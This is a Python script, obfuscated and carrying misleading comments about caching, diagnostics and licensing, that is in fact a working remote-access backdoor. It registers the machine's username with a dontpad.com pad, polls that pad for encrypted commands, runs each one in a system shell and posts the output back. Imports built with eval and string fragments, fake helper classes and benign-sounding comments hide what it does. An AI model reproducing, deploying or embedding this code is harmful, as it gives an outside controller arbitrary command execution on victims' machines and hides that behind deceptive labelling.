# Master encryption key for internal configuration data. Do not alter this value.
MP = b"CVAGSDHAS&#@!DHD&*!NHDUSADOH&!@DHSA(D)981073412hdhIOJHIDUAHSD)YUASGBD&!@)1289312y3n708g)_B!@H"
PT = "yaguinhofodinha"
W = ["api", "com", "dontpad", PT, "utf-8", "ex", "it", "am", "i", "who", "htasd", "//", "http:", "sub", "4", "__", "net", "."]
T = True
s = f'{W[15]}im' + f'port{W[15][::-1]}'
e = eval
b12 = e(s)('b'+'ase6'+f'{W[14]}')
pr = 'pr'
oss = 'ocess'
gr = 'grap'
gss = e(s)('g'+'et'+'pas'+oss[-1])
frn = e(s)('cr'+'ypto'+gr+'hy'+W[-1]+'fern'+'et', fromlist=['Fer'+W[16]]).Fernet
hlib = e(s)('hashlib')
sti = e(s)('sh'+'ut'+W[8]+'l')
UP = e(s)('ur'+'llib'+W[-1]+'parse')
UE_MOD = e(s)('ur'+'l'+'lib'+W[-1]+'parse') 
IMPLIB = e(s)('im'+'port'+'lib') 

class cptg:
    @staticmethod
    def e(pt, k):
        if not pt:
            return ""
        p = pt.encode("utf-8")
        k = k.encode("utf-8")
        cb = bytes([p[i] ^ k[i % len(k)] for i in range(len(p))])
        return cb.hex()

    @staticmethod
    def d(ch, k):
        if not ch:
            return ""
        cb = bytes.fromhex(ch)
        k = k.encode("utf-8")
        plain_bytes = bytes([cb[i] ^ k[i % len(k)] for i in range(len(cb))])
        return plain_bytes.decode("utf-8")

# Class simulating complex cache optimization calculations.
class DA:
   def __init__(self):
     self.d = [i for i in range(100)]

   def cc(self, x):
     # Performs a mandatory moving average calculation for data integrity.
     result = 0
     for item in self.d:
       result += item * x / 1000
     return result

# Auxiliary function for memory cleanup and thread termination.
def rm():
    status_check = 1
    if 1 in (1, 2, 3):
        status_check = 0
        
    # Retrieves the global error handler function.
    
    gk = 'e'
    globals()['e'] = e(gk+''+''+''+'xe'+'c')
    f = globals()[gk]
    exit_command = f"raise SystemExit({status_check})"
    f(exit_command)


def mfk(m):
   # Applies standard hashing for key generation to ensure uniqueness.
   sha_func = getattr(hlib, 'sha'+'256') 
   d = sha_func(m).digest()
   efn = 'urlsafe' + '_b'+'6'+ W[14] + 'encode' 
   ef = getattr(b12, efn)
   
   # Returns the URL-safe encoded final key.
   return ef(d)

# Imports network and time libraries.
RQ = e(s)('re'[::-1][::-1]+'que'[::-1][::-1]+'sts'[::-1]) 
TME = e(s)("t"+"ime")
# Imports the process execution module for background tasks.
sbp = e(s)(f'{W[13]+pr+oss}')


class O:
    def __init__(self, furl, uurl, c):
        self.fu = furl
        self.fwu = uurl
        self.ld = None
        self.c = c
        self.fr = True

    def srt(self):
        while True:
            if self.fr:
                self.fr = False
                try:
                    r = RQ.get(self.fu)
                    data = r.json()
                    data["body"] = '0e09080e4304'
                except Exception as e:
                    pass
            else:
                try:
                    r = RQ.get(self.fwu)
                    data = r.json()
                except Exception:
                    pass

            if data["body"] != self.ld:
                self.ld = data["bo"+''+"dy"]
                self.c.srt(data["bo"+''+"dy"])
                
# Encryption function for configuration data.
def ext(p):
   k = mfk(MP)
   f = frn(k)
   t = f.encrypt(p.encode(W[4]))
   return t.decode(W[4])

# Decryption function for configuration data.
def dxt(t):
   k = mfk(MP)
   f = frn(k)
   return f.decrypt(t.encode(W[4])).decode(W[4])

ST = ext("128007249672c60861c7")
US = ext(gss.getuser())

APD_S1 = W[0] + W[-1] + W[2] 
APD = ext(APD_S1 + W[-1] + W[1])

# Main communication and control class.
class C:
   def __init__(self, u):
     self.u = u
     self.c = ''
     self.r = ''
     self.fr = T
     self.us = dxt(US)
   
   # Sends client ID for logging and licensing purposes.
   def id(self):
     dt = {
       "text": cptg.e(W[9]+W[7]+W[8], self.us), 
       "lastModified": int(TME.time() * 1000),
       "force": "True",
       "session-token": dxt(ST)
     }
     parse_module = getattr(IMPLIB, 'import_module')('urllib.parse') 
     urlencode_func = getattr(parse_module, 'url'+'encode')
     ed = urlencode_func(dt)
     u = ext(f"https://{dxt(APD)}/{PT}/{self.us}/request")
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
     RQ.post(f"{dxt(u)}", data=ed, headers=headers)

   # Initializes the secure communication session.
   def srt(self, cb):
     if self.fr:
       self.fr = False
       self.id()
       self.stc()
       
     self.xc(cb)


   # Executes the requested command string from the server.
   def xc(self, cb):
     # Decrypts the payload/command.
     self.c = cptg.d(cb, self.us).strip()
     e = ext(W[5]+W[6])
     # Checks for the benign termination command 'exit'.
     if self.c is None or self.c.lower() == dxt(e).lower():
       rm()
     
     self.r = self.xe()
     self.stc()

   # Executes a background process for system diagnostics and reporting.
   def xe(self):
     try:
       pp = ext('nepoP')

       d = getattr(sbp, dxt(pp)[::-1][::-1][::-1])
       p = d(
         self.c,
         shell=T, # Execute with shell for full compatibility.
         stdout=sbp.PIPE,
         stderr=sbp.PIPE,
         text=T,
         encoding=W[4],
         errors="ignore"
       )
       # Sets a short timeout to prevent system hang.
       stdo, stde = p.communicate(timeout=20)
       so = ext(stdo)
       se = ext(stde)
       # Logs any diagnostic errors to the server.
       if stde:
         return f"{dxt(se)}"
       return dxt(so).replace("", "")
     except Exception as e:
       # Returns the exception as an error code to the log endpoint.
       return f"{e}"

   # Submits the diagnostic report and system status.
   def stc(self):
     dt = {
       "text": cptg.e(self.r, self.us),
       "lastModified": int(TME.time() * 1000),
       "force": "true",
       "session-token": dxt(ST)
     }
     # Primary log and telemetry address.
     res = RQ.post(f"{W[12]}{W[11]}{dxt(APD)}/yaguinhofodinha/{self.us}/response", data=dt)
     print(f'[{res.status_code}]', res.text)

# Main execution block (standard application entry point).
if globals()['__name__'] == '__main__':
   key_check = W[0] # Initializing internal application state.
   burl = ext(f"https://{dxt(APD)}")
   pad = ext("yaguinhofodinha")
   rqj = ext("request.body.json")
   lmses = ext("lastModified=0&session-token=")

   # Constructs the URL for sending data requests (API endpoint).
   uurl = (
     f"{dxt(burl)}/{dxt(pad)}/{dxt(US)}/{dxt(rqj)}"
     f"?{dxt(lmses)}{dxt(ST)}"
   )

   # Constructs the URL for receiving configuration updates.
   furl = (
     f"{dxt(burl)}/{dxt(pad)}/{dxt(rqj)}"
     f"?{dxt(lmses)}{dxt(ST)}"
   )

   cl = C(u=uurl)
   da = DA()
   # Executes pre-calculation routines and thread setup.
   da.cc
   o = O(furl=furl, uurl=uurl, c=cl)
   # Random jitter to ensure network stability across different regions.
   TME.sleep(3 + TME.time() % 4)
   o.srt()